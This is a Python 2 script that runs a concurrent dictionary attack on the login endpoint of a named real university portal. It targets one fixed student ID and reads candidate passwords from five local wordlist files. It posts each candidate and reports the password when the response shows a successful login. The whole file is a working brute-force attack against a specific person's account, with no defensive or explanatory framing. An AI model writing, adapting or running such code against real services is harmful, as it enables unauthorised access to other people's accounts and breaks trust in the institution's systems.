# coding=utf-8
import os
import linecache
import threading
import time
import requests
requests.adapters.DEFAULT_RETRIES = 5
import re
import gevent
from gevent import monkey; monkey.patch_socket()
from bs4 import BeautifulSoup as BS
from Queue import Queue 


def payloads(f,q):

	posturl = 'http://my.scu.edu.cn/userPasswordValidate.portal' 
	userkey = 'Login.Token1'
	userv = '2015223030087'
	passkey = 'Login.Token2'
	passv = 0
	goto = 'http://my.scu.edu.cn/loginSuccess.portal'
	gotoOnFail = 'http://my.scu.edu.cn/loginFailure.portal'

	payload = {}
	for line in f:
		passv = line[:-1]
		#print passv
		payload = {userkey:userv, passkey:passv, 'goto':goto, 'gotoOnFail':gotoOnFail}
		#print payload
		res = requests.post(posturl,data=payload)
		soup = BS(res.text, "lxml")
		#print soup
		result = re.compile('handleLoginSuccessed')
		t1 = soup.find(text=result) 
		if t1:
			print 'password found:'+passv
			q.put(passv)
			f.close()
			break
		else:
			print passv + ' is not the password.'
	f.close()

    
def main():

	q = Queue()
	result = []
	f1 = open("F:\dict\dict1.txt")
	f2 = open("F:\dict\dict2.txt")
	f3 = open("F:\dict\dict3.txt")
	f4 = open("F:\dict\dict4.txt")
	f5 = open("F:\dict\dict5.txt")

	gevent.joinall([
        gevent.spawn(payloads, f1, q),
        gevent.spawn(payloads, f2, q),
		gevent.spawn(payloads, f3, q),
        gevent.spawn(payloads, f4, q),
		gevent.spawn(payloads, f5, q),
])
	result.append(q.get())
	print result	

if __name__ == '__main__':
	main()